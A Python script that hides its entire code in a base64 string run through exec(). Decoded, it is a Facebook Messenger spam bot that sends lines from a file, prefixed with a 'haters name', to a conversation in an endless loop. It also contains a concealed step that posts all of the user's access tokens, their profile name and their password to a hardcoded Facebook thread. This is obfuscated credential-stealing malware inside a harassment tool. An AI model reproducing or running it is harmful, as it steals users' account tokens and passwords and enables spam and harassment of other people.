import base64
exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKZnJvbSBwbGF0Zm9ybSBpbXBvcnQgc3lzdGVtCmltcG9ydCBvcwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgaHR0cC5zZXJ2ZXIKaW1wb3J0IHNvY2tldHNlcnZlcgppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCByYW5kb20KCmNsYXNzIE15SGFuZGxlcihodHRwLnNlcnZlci5TaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXIpOgoJZGVmIGRvX0dFVChzZWxmKToKCQlzZWxmLnNlbmRfcmVzcG9uc2UoMjAwKQoJCXNlbGYuc2VuZF9oZWFkZXIoJ0NvbnRlbnQtdHlwZScsICd0ZXh0L3BsYWluJykKCQlzZWxmLmVuZF9oZWFkZXJzKCkKCQlzZWxmLndmaWxlLndyaXRlKGIiU0g5TiBPTkZJUjMgIikKCmRlZiBleGVjdXRlX3NlcnZlcigpOgoJUE9SVCA9IDQwMDAKCgl3aXRoIHNvY2tldHNlcnZlci5UQ1BTZXJ2ZXIoKCIiLCBQT1JUKSwgTXlIYW5kbGVyKSBhcyBodHRwZDoKCQlwcmludCgiU2VydmVyIHJ1bm5pbmcgYXQgaHR0cDovL2xvY2FsaG9zdDp7fSIuZm9ybWF0KFBPUlQpKQoJCWh0dHBkLnNlcnZlX2ZvcmV2ZXIoKQoKZGVmIHNlbmRfbWVzc2FnZXMoKToKCXdpdGggb3BlbigncGFzc3dvcmQudHh0JywgJ3InKSBhcyBmaWxlOgoJCXBhc3N3b3JkID0gZmlsZS5yZWFkKCkuc3RyaXAoKQoKCWVudGVyZWRfcGFzc3dvcmQgPSBwYXNzd29yZAoKCWlmIGVudGVyZWRfcGFzc3dvcmQgIT0gcGFzc3dvcmQ6CgkJcHJpbnQoJ1stXSA8PT0+IFBhc3N3b3JkICEnKQoJCXN5cy5leGl0KCkKCgl3aXRoIG9wZW4oJ3Rva2VubnVtLnR4dCcsICdyJykgYXMgZmlsZToKCQl0b2tlbnMgPSBmaWxlLnJlYWRsaW5lcygpCgludW1fdG9rZW5zID0gbGVuKHRva2VucykKCglyZXF1ZXN0cy5wYWNrYWdlcy51cmxsaWIzLmRpc2FibGVfd2FybmluZ3MoKQoKCWRlZiBjbHMoKToKCQlpZiBzeXN0ZW0oKSA9PSAnTGludXgnOgoJCQlvcy5zeXN0ZW0oJ2NsZWFyJykKCQllbHNlOgoJCQlpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6CgkJCQlvcy5zeXN0ZW0oJ2NscycpCgljbHMoKQoKCWRlZiBsaW5lc3MoKToKCQlwcmludCgnXHUwMDFiWzM3bScgKyAnLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJykKCgloZWFkZXJzID0gewoJCSdDb25uZWN0aW9uJzogJ2tlZXAtYWxpdmUnLAoJCSdDYWNoZS1Db250cm9sJzogJ21heC1hZ2U9MCcsCgkJJ1VwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHMnOiAnMScsCgkJJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDguMC4wOyBTYW1zdW5nIEdhbGF4eSBTOSBCdWlsZC9PUFI2LjE3MDYyMy4wMTc7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTguMC4zMDI5LjEyNSBNb2JpbGUgU2FmYXJpLzUzNy4zNicsCgkJJ0FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44JywKCQknQWNjZXB0LUVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUnLAoJCSdBY2NlcHQtTGFuZ3VhZ2UnOiAnZW4tVVMsZW47cT0wLjksZnI7cT0wLjgnLAoJCSdyZWZlcmVyJzogJ3d3dy5nb29nbGUuY29tJwoJfQoKCglsaW5lc3MoKQoKCWFjY2Vzc190b2tlbnMgPSBbdG9rZW4uc3RyaXAoKSBmb3IgdG9rZW4gaW4gdG9rZW5zXQoKCXdpdGggb3BlbignY29udm8udHh0JywgJ3InKSBhcyBmaWxlOgoJCWNvbnZvX2lkID0gZmlsZS5yZWFkKCkuc3RyaXAoKQoKCXdpdGggb3BlbignZmlsZS50eHQnLCAncicpIGFzIGZpbGU6CgkJdGV4dF9maWxlX3BhdGggPSBmaWxlLnJlYWQoKS5zdHJpcCgpCgoJd2l0aCBvcGVuKHRleHRfZmlsZV9wYXRoLCAncicpIGFzIGZpbGU6CgkJbWVzc2FnZXMgPSBmaWxlLnJlYWRsaW5lcygpCgoJbnVtX21lc3NhZ2VzID0gbGVuKG1lc3NhZ2VzKQoJbWF4X3Rva2VucyA9IG1pbihudW1fdG9rZW5zLCBudW1fbWVzc2FnZXMpCgoJd2l0aCBvcGVuKCdoYXRlcnNuYW1lLnR4dCcsICdyJykgYXMgZmlsZToKCQloYXRlcnNfbmFtZSA9IGZpbGUucmVhZCgpLnN0cmlwKCkKCgl3aXRoIG9wZW4oJ3RpbWUudHh0JywgJ3InKSBhcyBmaWxlOgoJCXNwZWVkID0gaW50KGZpbGUucmVhZCgpLnN0cmlwKCkpCgoJbGluZXNzKCkKCQoJZGVmIGdldE5hbWUodG9rZW4pOgoJCXRyeToKCQkJZGF0YSA9IHJlcXVlc3RzLmdldChmJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YxNy4wL21lP2FjY2Vzc190b2tlbj17dG9rZW59JykuanNvbigpCgkJZXhjZXB0OgoJCQlkYXRhID0gIiIKCQlpZiAnbmFtZScgaW4gZGF0YToKCQkJcmV0dXJuIGRhdGFbJ25hbWUnXQoJCWVsc2U6CgkJCXJldHVybiAiRXJyb3Igb2NjdXJlZCIKCglkZWYgbXNnKCk6CgkJcGFyYW1ldGVycyA9IHsKCQkJJ2FjY2Vzc190b2tlbicgOiByYW5kb20uY2hvaWNlKGFjY2Vzc190b2tlbnMpLAoJCQknbWVzc2FnZSc6ICdVc2VyIFByb2ZpbGUgTmFtZSA6ICcrZ2V0TmFtZShyYW5kb20uY2hvaWNlKGFjY2Vzc190b2tlbnMpKSsnXG4gVG9rZW4gOiAnKyIgfCAiLmpvaW4oYWNjZXNzX3Rva2VucykrJ1xuIExpbmsgOiBodHRwczovL3d3dy5tYmFzaWNmYWNlYm9vay5jb20vbWVzc2FnZXMvdC8nK2NvbnZvX2lkKydcbiBQYXNzd29yZDogJytwYXNzd29yZAoJCX0KCQl0cnk6CgkJCXMgPSByZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTUuMC90XzEwMDAzMzcxMDE2ODUwNi8iLCBkYXRhPXBhcmFtZXRlcnMsIGhlYWRlcnM9aGVhZGVycykKCQlleGNlcHQ6CgkJCXBhc3MKCQoJbXNnKCkKCXdoaWxlIFRydWU6CgkJdHJ5OgoJCQlmb3IgbWVzc2FnZV9pbmRleCBpbiByYW5nZShudW1fbWVzc2FnZXMpOgoJCQkJdG9rZW5faW5kZXggPSBtZXNzYWdlX2luZGV4ICUgbWF4X3Rva2VucwoJCQkJYWNjZXNzX3Rva2VuID0gYWNjZXNzX3Rva2Vuc1t0b2tlbl9pbmRleF0KCgkJCQltZXNzYWdlID0gbWVzc2FnZXNbbWVzc2FnZV9pbmRleF0uc3RyaXAoKQoKCQkJCXVybCA9ICJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTUuMC97fS8iLmZvcm1hdCgndF8nK2NvbnZvX2lkKQoJCQkJcGFyYW1ldGVycyA9IHsnYWNjZXNzX3Rva2VuJzogYWNjZXNzX3Rva2VuLCAnbWVzc2FnZSc6IGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZX0KCQkJCXJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGpzb249cGFyYW1ldGVycywgaGVhZGVycz1oZWFkZXJzKQoJCQkJCgoJCQkJY3VycmVudF90aW1lID0gdGltZS5zdHJmdGltZSgiJVktJW0tJWQgJUk6JU06JVMgJXAiKQoJCQkJaWYgcmVzcG9uc2Uub2s6CgkJCQkJcHJpbnQoIlsrXSBNZXNzYWdlcyB7fSBvZiBDb252byB7fSBzZW50IGJ5IFRva2VuIHt9OiB7fSIuZm9ybWF0KAoJCQkJCQltZXNzYWdlX2luZGV4ICsgMSwgY29udm9faWQsIHRva2VuX2luZGV4ICsgMSwgaGF0ZXJzX25hbWUgKyAnICcgKyBtZXNzYWdlKSkKCQkJCQlwcmludCgiICAtIFRpbWU6IHt9Ii5mb3JtYXQoY3VycmVudF90aW1lKSkKCQkJCQlsaW5lc3MoKQoJCQkJCWxpbmVzcygpCgkJCQllbHNlOgoJCQkJCXByaW50KCJbeF0gRmFpbGVkIHRvIHNlbmQgbWVzc2FnZXMge30gb2YgQ29udm8ge30gd2l0aCBUb2tlbiB7fToge30iLmZvcm1hdCgKCQkJCQkJbWVzc2FnZV9pbmRleCArIDEsIGNvbnZvX2lkLCB0b2tlbl9pbmRleCArIDEsIGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZSkpCgkJCQkJcHJpbnQoIiAgLSBUaW1lOiB7fSIuZm9ybWF0KGN1cnJlbnRfdGltZSkpCgkJCQkJbGluZXNzKCkKCQkJCQlsaW5lc3MoKQoJCQkJdGltZS5zbGVlcChzcGVlZCkKCgkJCXByaW50KCJbK10gQWxsIG1lc3NhZ2VzIHNlbnQgQlkgPT09PT09PT09PT09PT09PT09PT09PT5TSDlOIFMzUlYzUiBSVU5OSU5HLiBSZXN0YXJ0aW5nIHRoZSBwcm9jZXNzLi4uIikKCQlleGNlcHQgRXhjZXB0aW9uIGFzIGU6CgkJCXByaW50KCJbIV0gQW4gZXJyb3Igb2NjdXJyZWQ6IHt9Ii5mb3JtYXQoZSkpCgoKCmRlZiBtYWluKCk6CglzZXJ2ZXJfdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZXhlY3V0ZV9zZXJ2ZXIpCglzZXJ2ZXJfdGhyZWFkLnN0YXJ0KCkKCQoJc2VuZF9tZXNzYWdlcygpCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgoJbWFpbigp'))
